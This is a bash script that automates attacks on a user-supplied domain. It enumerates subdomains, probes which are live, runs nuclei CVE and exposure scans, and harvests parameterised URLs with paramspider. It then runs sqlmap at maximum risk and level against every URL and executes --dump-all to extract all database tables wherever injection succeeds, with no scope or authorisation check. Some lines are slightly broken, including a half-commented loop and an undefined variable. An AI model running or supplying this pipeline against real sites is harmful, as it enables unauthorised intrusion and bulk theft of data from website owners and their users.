#!/bin/bash

read -p "Enter the domain: " domain

directory="$domain"
mkdir "$directory"

echo "Enumerating subdomains using subfinder..."
subfinder -d $domain | tee "$directory/subfinder_output.txt"

echo "Fetching subdomains using assetfinder..."
assetfinder --subs-only $domain | tee "$directory/assetfinder_output.txt"

subdomains=$(cat "$directory/subfinder_output.txt" "$directory/assetfinder_output.txt" | sort -u)

subdomains_file="$directory/subdomains.txt"
echo "$subdomains" > "$subdomains_file"

echo "Performing HTTP checks using httpx..."
cat "$subdomains_file" | httpx -silent > "$directory/httpx_output.txt"

gnome-terminal -- bash -c "nuclei -l $directory/httpx_output.txt -t /home/subhash/nuclei-templates/cves -vv | tee $directory/nuclei_output.txt"

gnome-terminal -- bash -c "nuclei -l $directory/httpx_output.txt -t /home/subhash/nuclei-templates/exposures -s low,medium,high,critical -vv | tee $directory/exposures.txt " &

echo "Running paramspider on the URLs..."
#paramspider_output_dir="$directory/paramspider_output"
#mkdir "$paramspider_output_dir"
#while IFS= read -r url; do
  echo "Running paramspider on: $url"
  paramspider -l "$directory/httpx_output.txt"
#done < "$directory/httpx_output.txt"
results="$directory/../results"
cat "$results"/*.txt | sort -u > "$directory/finalparam.txt"

urls=$(cat "$directory/finalparam.txt")

parsed_urls=()
for url in $urls; do
  parameters=$(echo "$url" | sed -n 's/.*?\(.*\)/\1/p')
  parsed_urls+=("$url|$parameters")
done

sorted_urls=$(printf '%s\n' "${parsed_urls[@]}" | sort -t '|' -k2 -u)

echo "$sorted_urls" | awk -F '|' '{print $1}' > "$directory/sorted_urls.txt"

echo "Running SQLMap on the URLs..."
target_file=$directory/sorted_urls.txt
gnome-terminal -- bash -c "
while IFS= read -r url; do
    echo \"Scanning URL: \$url\"
    echo \"=============================================\"

    # Run SQLMap with --batch option to check vulnerabilities
    sqlmap -u \"\$url\" --risk 3 --level 5 --batch | tee sqlmap_output.txt

    # Check if any parameter is vulnerable
    if grep -q \"parameter(s) are vulnerable\" sqlmap_output.txt; then
        echo \"At least one parameter is vulnerable for URL: \$url\"
        echo \"Dumping tables...\"
        echo \"=============================================\"

        # Run SQLMap on the vulnerable URL with --dump-all option to dump tables
        sqlmap -u \"\$url\" --dump-all | tee sqltables.txt
    else
        echo \"No parameter is vulnerable for URL: \$url\"
        echo \"=============================================\"
    fi

    echo
done < \"$target_file\"
"


#echo "Running kxss on the parameters..."
#kxss -i "$directory/sorted_urls.txt" | tee "$directory/kxss_output.txt"

mv "$subdomains_file" "$results" "$directory/httpx_output.txt" "$paramspider_output_dir" "$directory"

echo "Output files moved to $directory"
